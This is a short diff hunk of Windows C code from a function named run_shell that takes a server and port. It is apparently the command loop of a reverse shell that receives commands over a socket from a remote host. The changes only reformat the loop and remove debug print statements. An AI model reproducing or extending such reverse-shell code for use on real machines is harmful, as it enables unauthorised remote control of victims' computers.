@@ -116,26 +116,18 @@ void run_shell( char *server, int port ){
 				CloseHandle( pinfo.hProcess );
 				CloseHandle( pinfo.hThread );
 				
-				memset( recv_data, 0, sizeof( recv_data ) );
+				memset( recv_data, 0, sizeof(recv_data) );
 				
 				int recv_cmd = recv( sock, recv_data, DEF_BUFF, 0 );
-				printf("recv_cmd: %d\n", recv_cmd);
 				
-				if( recv_cmd <= 0 ) {
+					if( recv_cmd <= 0 ) {
 					
-					closesocket( sock );
-					WSACleanup();
-					continue;
+						closesocket( sock );
+						WSACleanup();
+						continue;
 					
-				}
-				
-					//DEF_BUFF = htons( DEF_BUFF );
-					if ( recv_cmd == DEF_BUFF ) {
-						recv_cmd = recv( sock, (char *)recv_data, DEF_BUFF, 0 );
-						printf("recv_cmd: %d\n", recv_cmd);
-
-					printf("DEF_BUFF: %s\n", DEF_BUFF );
-				}
+					}
+					
 									
 			}
 				
